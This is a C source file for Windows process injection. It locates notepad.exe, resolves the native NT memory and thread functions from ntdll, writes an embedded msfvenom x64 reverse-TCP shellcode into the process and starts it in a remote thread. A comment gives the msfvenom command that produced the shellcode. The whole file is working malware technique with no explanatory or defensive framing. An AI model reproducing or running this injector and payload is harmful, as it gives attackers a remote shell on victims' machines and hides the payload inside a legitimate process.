#include <stdlib.h>
#include <windows.h>
#include <memoryapi.h>
#include <stdio.h>
#include <tlhelp32.h>
#define TARGET_PROCESS_NAME "notepad.exe"

#define InitializeObjectAttributes(p,n,a,r,s) { \
(p)->Length = sizeof(OBJECT_ATTRIBUTES); \
(p)->RootDirectory = (r); \
(p)->Attributes = (a); \
(p)->ObjectName = (n); \
(p)->SecurityDescriptor = (s); \
(p)->SecurityQualityOfService = NULL; \
}

typedef struct _CLIENT_ID
{
	PVOID UniqueProcess;
	PVOID UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;


typedef struct _OBJECT_ATTRIBUTES {
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES,*POBJECT_ATTRIBUTES ;

typedef NTSTATUS(NTAPI* TNtOpenProcess)(PHANDLE ProcessHandle, ACCESS_MASK AccessMask, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientID);
TNtOpenProcess NtOpenProcess = NULL;


typedef NTSTATUS(NTAPI* TNtAllocateVirtualMemory)(HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
TNtAllocateVirtualMemory NtAllocateVirtualMemory = NULL;

typedef NTSTATUS(NTAPI* TNtWriteVirtualMemory)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWritten OPTIONAL);
TNtWriteVirtualMemory NtWriteVirtualMemory = NULL;


typedef NTSTATUS(NTAPI* TNtCreateThreadEx)(PHANDLE hThread,ACCESS_MASK DesiredAccess,PVOID ObjectAttributes,HANDLE ProcessHandle,PVOID lpStartAddress,PVOID lpParameter,ULONG Flags,SIZE_T StackZeroBits,SIZE_T SizeOfStackCommit,SIZE_T SizeOfStackReserve,PVOID lpBytesBuffer);
TNtCreateThreadEx NtCreateThreadEx = NULL;

DWORD find_process(char *process){

	PROCESSENTRY32 process_entry;
	process_entry.dwSize = sizeof(PROCESSENTRY32);

    //get the list of processes
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    //check processes to find TARGET_PROCESS_NAME
    if (Process32First(snapshot, &process_entry) == TRUE){

        while (Process32Next(snapshot, &process_entry) == TRUE){

			if (stricmp(process_entry.szExeFile, process) == 0){

				CloseHandle(snapshot);
				return process_entry.th32ProcessID;
			}
		}
	}

	CloseHandle(snapshot);
	return 0;

}

int main(int argc, char *argv[]){
	//msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=4444 -b \x00\x0a\x0d -f c
	unsigned char buf[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"                                                                                                                    
"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"                                                                                                                    
"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"                                                                                                                    
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"                                                                                                                    
"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"                                                                                                                    
"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"                                                                                                                    
"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"                                                                                                                    
"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"                                                                                                                    
"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"                                                                                                                    
"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"                                                                                                                    
"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"                                                                                                                    
"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"                                                                                                                    
"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"                                                                                                                    
"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"                                                                                                                    
"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00"                                                                                                                    
"\x49\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x01\x36\x41\x54"                                                                                                                    
"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c"                                                                                                                    
"\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff"                                                                                                                    
"\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2"                                                                                                                    
"\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48"                                                                                                                    
"\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99"                                                                                                                    
"\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x49\xb8\x63"                                                                                                                    
"\x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89\xe2\x57"                                                                                                                    
"\x57\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44"                                                                                                                    
"\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6"                                                                                                                    
"\x56\x50\x41\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff"
"\xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5"
"\x48\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
"\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
"\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";

	HMODULE hNtdll = LoadLibraryW(L"ntdll");
	if (!hNtdll)
		return 1;
 
	NtOpenProcess = (TNtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
	if (!NtOpenProcess){
		printf("faild to find NtOpenProcess base address in ntdll \n");
		return 1;
	}

	NtAllocateVirtualMemory = (TNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	if (!NtAllocateVirtualMemory){
		printf("faild to find NtAllocateVirtualMemory base address in ntdll \n");
		return 1;
	}

	NtWriteVirtualMemory = (TNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
	if (!NtWriteVirtualMemory){
		printf("faild to find NtWriteVirtualMemory base address in ntdll \n");
		return 1;
	}

	NtCreateThreadEx = (TNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
	if (!NtCreateThreadEx){
		printf("faild to find NtCreateThreadEx base address in ntdll \n");
		return 1;
	}


	
	HANDLE thread_handle,target_process_handle;
	OBJECT_ATTRIBUTES oa;
	
	HANDLE remote_thread_handle;
	LPVOID remote_process_buffer = NULL;
	unsigned int buf_len = sizeof(buf);

	
	InitializeObjectAttributes(&oa, NULL,0,NULL,NULL);


	//find the process id
	DWORD procid = find_process(TARGET_PROCESS_NAME);
	if (procid == 0){
		printf("failed to find %s process\n",TARGET_PROCESS_NAME );
		return 1;
	}
	printf("%s process found with process id: %d\n", TARGET_PROCESS_NAME, procid);

	CLIENT_ID ci = { (HANDLE)procid, NULL };

	//open a process handle
	NtOpenProcess(&target_process_handle,PROCESS_ALL_ACCESS, &oa, &ci);
	
	//allocate a space in the target process
	NtAllocateVirtualMemory(target_process_handle, &remote_process_buffer, 0,&buf_len ,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	//write the buffer (shellcode) into the space
	NtWriteVirtualMemory(target_process_handle, remote_process_buffer, buf, buf_len, NULL);
	//create and run thread in target process
	NtCreateThreadEx(&thread_handle, 0x1FFFFF, NULL, target_process_handle,(LPTHREAD_START_ROUTINE)remote_process_buffer,NULL, FALSE, NULL, NULL, NULL, NULL);

	//close the handle
	CloseHandle(target_process_handle);

	return 0;
}
